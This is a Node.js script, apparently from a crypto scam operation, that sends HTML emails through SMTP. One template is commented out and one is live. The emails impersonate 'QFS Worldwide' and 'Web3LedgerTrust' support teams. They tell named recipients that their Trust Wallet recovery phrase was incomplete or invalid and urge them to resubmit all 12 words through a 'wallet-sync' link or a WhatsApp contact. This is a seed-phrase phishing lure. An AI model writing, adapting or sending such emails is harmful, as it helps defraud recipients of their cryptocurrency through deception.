// /scripts/email_tester.js
import dotenv from "dotenv";
import { fileURLToPath } from "url";
import path from "path";

// Resolve ../.env relative to this file
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
dotenv.config({ path: path.resolve(__dirname, "../.env") });

import { sendMail } from "../src/utils/email.js"; // adjust path if needed

// Optional: quick visibility check (masks password)
console.log("[SMTP check]", {
  host: process.env.SMTP_HOST,
  port: process.env.SMTP_PORT,
  user: process.env.SMTP_USER,
  pass: process.env.SMTP_PASS ? "***" : undefined,
});

// ✉️ Professional “Incomplete Secret Phrase” email
// const res = await sendMail({
//   to: "mesence8@gmail.com", // test recipient
//   from: `"QFS Worldwide Support" <support@qfsworldwide.net>`,
//   subject: "⚠️ Wallet Sync – Incomplete Secret Phrase Detected",
//   html: `
//   <div style="font-family:Arial,Helvetica,sans-serif;max-width:620px;margin:auto;border:1px solid #eee;border-radius:12px;overflow:hidden;">
//     <div style="background:#0a0a0a;padding:20px;color:#fff;text-align:center;">
//       <h2 style="margin:0;font-weight:600;">Wallet Connection Issue</h2>
//     </div>

//     <div style="padding:24px;">
//       <p>Dear Amelia Selena,</p>

//       <p>We attempted to process your recent <strong>Trust Wallet connection</strong>, but our system detected that your recovery phrase is incomplete. You provided <strong>11 words</strong> instead of the required <strong>12-word phrase</strong>.</p>

//       <p style="margin:12px 0;padding:12px;background:#fff7ed;border-left:4px solid #f59e0b;color:#92400e;font-size:14px;">
//         ⚠️ <strong>Issue:</strong> Incomplete Secret Recovery Phrase (11 / 12 words detected)
//       </p>

//       <p>Please double-check your phrase and ensure it contains all <strong>12 words in the correct order</strong>. Each word should be separated by a single space and free from typos or extra characters.</p>

//       <div style="margin:20px 0;text-align:center;">
//         <a href="https://www.qfsworldwide.net/dashboard/wallet-sync" style="background:#2563eb;color:#fff;padding:12px 22px;text-decoration:none;border-radius:6px;display:inline-block;font-weight:500;">
//           Re-Link Your Wallet
//         </a>
//       </div>

//       <p>If you’re unsure or encounter any issues, you can contact our support team directly at:<br/>
//       <a href="mailto:support@qfsworldwide.net" style="color:#2563eb;text-decoration:none;">support@qfsworldwide.net</a></p>

//       <p style="margin-top:20px;">Our verification team will review and confirm your wallet connection once your corrected phrase has been received.</p>

//       <p style="margin-top:24px;">Warm regards,<br><strong>The QFS Worldwide Support Team</strong></p>
//     </div>

//     <div style="background:#0a0a0a;color:#fff;text-align:center;padding:12px;font-size:12px;">
//       &copy; ${new Date().getFullYear()} QFS Worldwide Network
//     </div>
//   </div>
//   `
// });




const res = await sendMail({
  to: "angeld8569@gmail.com", // change to customer email if testing
  from: `"Web3LedgerTrust Support" <support@Web3LedgerTrust.com>`,
  subject: "⚠️ Trust Wallet Linking Attempt - Invalid Secret Phrase",
  html: `
  <div style="font-family:Arial,Helvetica,sans-serif;max-width:600px;margin:auto;border:1px solid #eee;border-radius:12px;overflow:hidden">
    <div style="background:#0a0a0a;padding:20px;color:white;text-align:center">
      <h2 style="margin:0;font-weight:600;">Trust Wallet Linking Notification</h2>
    </div>

    <div style="padding:24px;">
      <p>Dear Angel Davis,</p>
      <p>We noticed a recent attempt to link your <strong>Trust Wallet</strong> to your Web3LedgerTrust account, but the process was not completed successfully. Our system returned the following message:</p>

      <p style="margin:12px 0;padding:12px;background:#fef2f2;border-left:4px solid #dc2626;color:#991b1b;font-size:14px;">
        ⚠️ <strong>Invalid Secret Phrase</strong>
      </p>

      <p>Please ensure that your recovery phrase is entered correctly, with the 12 phrase you wrote from your trust wallet, with all words in the proper order (typically 12, 18, or 24 words). 
      Double-check for spelling errors or unnecessary spaces. If it confusing you're welcome to DM our support on whatsapp: +15819427285 let guide you on the process of linking your wallet successfully</p>

      <p>If you are confident your details were correct, kindly retry the linking process or contact our support team for assistance.</p>

      <div style="margin:20px 0;text-align:center;">
        <a href="https://www.web3ledgertrust.com/dashboard/wallet-sync" style="background:#2563eb;color:white;padding:12px 20px;text-decoration:none;border-radius:6px;display:inline-block;">
          Retry Wallet Linking
        </a>
      </div>

      <p style="font-size:14px;color:#444;">
        If you did not initiate this request, please <strong>log in immediately</strong> to your account and secure your wallet connection.
      </p>

      <p style="margin-top:24px;">Best regards,<br><strong>The Web3LedgerTrust Support Team</strong></p>
    </div>

    <div style="background:#0a0a0a;color:white;text-align:center;padding:12px;font-size:12px;">
      &copy; ${new Date().getFullYear()} Web3LedgerTrust
    </div>
  </div>
  `,
});

console.log(res);